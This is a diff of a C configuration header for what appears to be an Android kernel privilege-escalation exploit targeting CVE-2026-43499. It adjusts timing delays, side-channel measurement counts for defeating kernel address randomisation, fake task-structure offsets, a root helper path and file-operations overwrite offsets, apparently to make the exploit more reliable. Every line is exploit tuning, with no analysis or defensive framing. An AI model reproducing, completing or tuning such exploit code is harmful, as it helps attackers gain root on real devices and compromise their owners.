@@ -25,7 +25,7 @@
  * ------------------------------------------------------------------------- */
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#define FOPS_ROUTE_COARSE_DELAY_USEC 40000
+#define FOPS_ROUTE_COARSE_DELAY_USEC 50000
 #define FOPS_ROUTE_FINE_DELAY_TICKS \
   0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
 #define PRODUCTION_STACK_PI_RIGHT_ONLY 1
@@ -95,8 +95,8 @@
 
 /* --- slide kernelsnitch tuning ------------------------------------------- */
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 24
-#define SLIDE_KSNITCH_AVERAGE 4
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE 8
 
 /* --- controlled-mm bank layout ------------------------------------------- */
 #define SLIDE_BANK_SLOTS 4
@@ -121,8 +121,8 @@
 #define FAKE_TASK_TASK_GROUP_OFF  0x400ULL
 
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define ROOT_UMH_WORK_OFF 0x6000
-#define ROOT_UMH_DATA_OFF 0x6200
+#define ROOT_UMH_WORK_OFF 0x7800
+#define ROOT_UMH_DATA_OFF 0x7a00
 
 /* ---------------------------------------------------------------------------
  * Static kernel symbol offsets (text-relative)
@@ -205,7 +205,7 @@
  * ------------------------------------------------------------------------- */
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
+#define FOPS_OFF 0x7000
 #define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
